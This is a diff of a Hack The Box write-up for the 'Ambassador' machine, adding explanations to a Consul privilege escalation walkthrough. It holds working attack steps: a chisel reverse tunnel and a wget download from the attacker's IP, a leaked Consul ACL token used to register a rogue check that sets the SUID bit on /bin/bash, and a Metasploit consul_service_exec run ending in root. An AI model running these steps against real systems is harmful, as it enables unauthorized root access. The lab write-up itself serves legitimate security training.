@@ -1,8 +1,8 @@
 ![image](https://user-images.githubusercontent.com/105310322/193700576-4c367863-b493-473b-811d-8f9f18946064.png)
 
-### Tools: feroxbuster, sqlitebrowser, sqldump
+### Tools: feroxbuster, sqlitebrowser, sqldump, git, Consul
 
-### Vulnerabilities: Grafana LFI, MySQL creds, 
+### Vulnerabilities: Grafana LFI, MySQL creds, Consul ACL token
 
 ```console
 └─$ nmap -A -p- -T4 -Pn 10.129.51.253
@@ -411,12 +411,7 @@ developer@ambassador:~$ cat user.txt
 6c698***************************
 ```
 
-```console
-developer@ambassador:~$ sudo -l
-[sudo] password for developer: 
-Sorry, user developer may not run sudo on ambassador.
-developer@ambassador:~$ 
-```
+From pspy it shows root is running consul.
 
 ```
 2022/10/04 16:24:54 CMD: UID=0    PID=1063   | /usr/sbin/apache2 -k start 
@@ -439,6 +434,9 @@ developer@ambassador:~$
 2022/10/04 16:25:01 CMD: UID=0    PID=30443  | /bin/bash /root/cleanup.sh 
 2022/10/04 16:25:01 CMD: UID=0    PID=30444  | find /etc/consul.d/config.d/* -mmin +10 -delete 
 ```
+
+Linpeas also tells us that there are a couple of other services running on open ports.
+
 ```
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
@@ -456,11 +454,13 @@ tcp6       0      0 :::3000                 :::*                    LISTEN      
 tcp6       0      0 :::80                   :::*                    LISTEN      -  
 ```
 
+By using curl we can confirm that consul is being ran on port 8500.
 
 ```
 developer@ambassador:/tmp$ curl http://127.0.0.1:8500
 Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.
 ```
+As developer we can run consul and check the version so we can find an exploit.
 
 ```
 developer@ambassador:/tmp$ consul --version
@@ -469,8 +469,6 @@ Revision 0e046bbb
 Build Date 2022-09-20T20:30:07Z
 Protocol 2 spoken by default, understands 2 to 3 (agent will automatically use protocol >2 when speaking to compatible agents)
 ```
-
-https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960
 
 ```
 └──╼ [★]$ chisel server --reverse --port 1235
@@ -484,8 +482,13 @@ developer@ambassador:/tmp$ ./chisellinuxamd64 client 10.10.14.63:1235 R:8500:127
 2022/10/04 17:01:34 client: Connecting to ws://10.10.14.63:1235
 2022/10/04 17:01:34 client: Connected (Latency 3.369374ms)
 ```
+Linpeas also tells us that there is a .git file. From doing other Machines on HTB everytime there has been a .git I have found good info to use.
 
+```
 /opt/my-app/.git
+```
+
+We have a couple of files we can check out.
 
 ```
 └──╼ [★]$ git ls-files --stage
@@ -498,6 +501,8 @@ developer@ambassador:/tmp$ ./chisellinuxamd64 client 10.10.14.63:1235 R:8500:127
 100644 d573d56be33180e77e60c3eee941999acf7f1bd9 0	whackywidget/whackywidget/urls.py
 100644 4a1f6dc2de28483ff9e518514db9b940967f305b 0	whackywidget/whackywidget/wsgi.py
 ```
+
+Git log shows some changes took place.
 
 ```
 └──╼ [★]$ git log
@@ -528,6 +533,7 @@ Date:   Sun Mar 13 22:44:11 2022 +0000
 
 ```
 
+If we check out the commit with config script it reveals a command used with consul and a token!
 
 ```
 └──╼ [★]$ git show c982db8eff6f10f8f3a7d802f79f2705e7a21b55
@@ -548,6 +554,8 @@ index 0000000..35c08f6
 +
 +consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
 ```
+
+I thought it was interesting that there was a secret key found in this one but I did not find anything to do with it so it was likely a rabbit hole.
 
 ```
 └──╼ [★]$ git show 79406a8e4d6229e1950f76e5147e0feacf452f8e
@@ -579,7 +587,7 @@ SECRET_KEY = 'django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l
 DEBUG = True
 ```
 
-For the metasploit version we can use the ACL token we found earlier in the .git files and configure the options.
+To solve this with metasploit we can use the ACL token we found earlier in the .git files and configure the options.
 
 ```console
 [msf](Jobs:0 Agents:0) exploit(multi/misc/consul_service_exec) >> options
@@ -646,8 +654,52 @@ Exploit target:
 
 (Meterpreter 1)(/) > cat /root/root.txt
 18bf****************************
-********************************
 
 ```
 
+For the manual version the link below gives info and scripts to make the exploit happen.
 
+https://www.consul.io/docs/discovery/checks
+
+Edit the script slightly to chmod bash to have a suid bit.
+
+```hcl
+check = {
+  id = "rogue"
+  name = "rogue"
+  args = ["/usr/bin/chmod","4777","/bin/bash"]
+  interval = "10s"
+  timeout = "1s"
+}
+```
+
+Upload the file to the victim and copy the file into the consul config.
+
+```console
+developer@ambassador:~$ wget http://10.10.14.63:8000/exploit.hcl
+developer@ambassador:~$ cp exploit.hcl /etc/consul.d/config.d/
+```
+Next we are going to run the commands directly with consul and use the token found earlier in the .git files.
+
+Note: Consul documentation will help you out the most for learning how to use this program.
+
+```console
+developer@ambassador:~$ consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+developer@ambassador:~$ consul services register -token=bb03b43b-1d81-d62b-24b5-39540ee469b5 /etc/consul.d/config.d/exploit.hcl
+developer@ambassador:~$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1183448 Apr 18 09:14 /bin/bash
+developer@ambassador:~$ consul reload -token=bb03b43b-1d81-d62b-24b5-39540ee469b5
+Configuration reload triggered
+```
+After running these commands /bin/bash should have the suid bit set and you can run commands as root!
+
+Note: There was some inconsistency doing this. Had to run it multiple times until it eventually worked.
+
+```console
+developer@ambassador:~$ bash -p
+bash-5.0# id
+uid=1000(developer) gid=1000(developer) euid=0(root) groups=1000(developer)
+bash-5.0# cat /root/root.txt
+a693****************************
+bash-5.0# 
+```
